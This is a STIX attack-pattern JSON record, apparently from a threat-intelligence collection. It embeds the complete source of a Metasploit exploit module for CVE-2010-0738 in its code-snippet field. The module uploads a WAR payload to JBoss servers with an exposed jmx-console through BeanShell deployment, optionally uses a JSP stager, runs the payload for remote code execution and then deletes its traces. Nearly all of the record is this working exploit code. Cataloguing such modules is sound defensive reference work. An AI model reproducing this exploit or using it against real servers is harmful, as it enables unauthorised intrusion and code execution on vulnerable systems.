{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a60bd0e-3feb-4fa7-ad96-a47a46bb2b87",
    "created": "2024-08-14T17:08:06.002999Z",
    "modified": "2024-08-14T17:08:06.003003Z",
    "name": "JBoss JMX Console Beanshell Deployer WAR Upload and Deployment",
    "description": " This module can be used to install a WAR file payload on JBoss servers that have an exposed \"jmx-console\" application. The payload is put on the server by using the jboss.system:BSHDeployer\\'s createScriptDeployment() method. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jboss_bshdeployer.rb",
            "external_id": "jboss_bshdeployer.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.redteam-pentesting.de/publications/jboss"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=574105"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /(Jetty|JBoss)/ ] }\n\n  include Msf::Exploit::Remote::HTTP::JBoss\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t=> 'JBoss JMX Console Beanshell Deployer WAR Upload and Deployment',\n      'Description'\t=> %q{\n          This module can be used to install a WAR file payload on JBoss servers that have\n        an exposed \"jmx-console\" application. The payload is put on the server by\n        using the jboss.system:BSHDeployer\\'s createScriptDeployment() method.\n      },\n      'Author'       =>\n        [\n          'Patrick Hof',\n          'jduck',\n          'Konrads Smelkovs',\n          'h0ng10'\n        ],\n      'License'\t\t=> BSD_LICENSE,\n      'References'\t=>\n        [\n          [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST\n          [ 'OSVDB', '64171' ],\n          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],\n        ],\n      'Privileged'   => true,\n      'Platform'     => %w{ java linux win },\n      'Stance'       => Msf::Exploit::Stance::Aggressive,\n      'Targets'     =>\n        [\n          #\n          # do target detection but java meter by default\n          # detect via /manager/serverinfo\n          #\n          [ 'Automatic (Java based)',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            } ],\n\n          #\n          # Platform specific targets only\n          #\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            },\n          ],\n          [ 'Linux Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ],\n\n          #\n          # Java version\n          #\n          [ 'Java Universal',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n            }\n          ]\n        ],\n      'DisclosureDate' => '2010-04-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('JSP',\t     [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),\n        OptString.new('APPBASE',\t [ false, 'Application base name, (default: random)', nil ])\n      ])\n  end\n\n\n  def exploit\n    jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))\n    app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))\n\n    p = payload\n    mytarget = target\n\n    if target.name =~ /Automatic/\n      mytarget = auto_target(targets)\n      unless mytarget\n        fail_with(Failure::NoTarget, \"Unable to automatically select a target\")\n      end\n      print_status(\"Automatically selected target \\\"#{mytarget.name}\\\"\")\n    else\n      print_status(\"Using manually select target \\\"#{mytarget.name}\\\"\")\n    end\n    arch = mytarget.arch\n\n    # set arch/platform from the target\n    plat = [Msf::Module::PlatformList.new(mytarget['Platform']).platforms[0]]\n\n    # We must regenerate the payload in case our auto-magic changed something.\n    return if ((p = exploit_regenerate_payload(plat, arch)) == nil)\n\n    # Generate the WAR containing the payload\n    war_data = p.encoded_war({\n      :app_name => app_base,\n      :jsp_name => jsp_name,\n      :arch => mytarget.arch,\n      :platform => mytarget.platform\n    }).to_s\n\n    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\\n/, '')\n\n    if http_verb == 'POST'\n      print_status(\"Deploying payload...\")\n      opts = {\n        :file => \"#{app_base}.war\",\n        :contents => encoded_payload\n      }\n    else\n      print_status(\"Deploying stager...\")\n      stager_base     = rand_text_alpha(8+rand(8))\n      stager_jsp_name = rand_text_alpha(8+rand(8))\n      stager_contents = stager_jsp(app_base)\n\n      opts = {\n        :dir => \"#{stager_base}.war\",\n        :file => \"#{stager_base}.war/#{stager_jsp_name}.jsp\",\n        :contents => Rex::Text.encode_base64(stager_contents).gsub(/\\n/, '')\n      }\n    end\n\n    bsh_payload = generate_bsh(:create, opts)\n    package = deploy_bsh(bsh_payload)\n\n    if package.nil?\n      fail_with(Failure::Unknown, \"Failed to deploy\")\n    end\n\n    unless http_verb == 'POST'\n      # now we call the stager to deploy our real payload war\n      stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'\n      payload_data = \"#{rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}\"\n      print_status(\"Calling stager #{stager_uri } to deploy final payload\")\n      res = deploy('method' => 'POST',\n                   'data'   => payload_data,\n                   'uri'    => stager_uri)\n      unless res && res.code == 200\n        fail_with(Failure::Unknown, \"Failed to deploy\")\n      end\n    end\n\n\n    #\n    # EXECUTE\n    #\n    uri = '/' + app_base + '/' + jsp_name + '.jsp'\n    print_status(\"Calling JSP file with final payload...\")\n    print_status(\"Executing #{uri}...\")\n    deploy('uri' => uri, 'method' => 'GET')\n\n    #\n    # DELETE\n    #\n    # The WAR can only be removed by physically deleting it, otherwise it\n    # will get redeployed after a server restart.\n    print_status(\"Undeploying #{uri} by deleting the WAR file via BSHDeployer...\")\n\n    files = {}\n    unless http_verb == 'POST'\n      files[:stager_jsp_name] = \"#{stager_base}.war/#{stager_jsp_name}.jsp\"\n      files[:stager_base] = \"#{stager_base}.war\"\n    end\n    files[:app_base] = \"#{app_base}.war\"\n    delete_script = generate_bsh(:delete, files)\n\n    res = invoke_bsh_script(delete_script, package)\n    if res.nil?\n      print_warning(\"WARNING: Unable to remove WAR [No Response]\")\n    elsif res.code < 200 || res.code >= 300\n      print_warning(\"WARNING: Unable to remove WAR [#{res.code} #{res.message}]\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-26",
    "x_mitre_platforms": [
        "java'"
    ]
}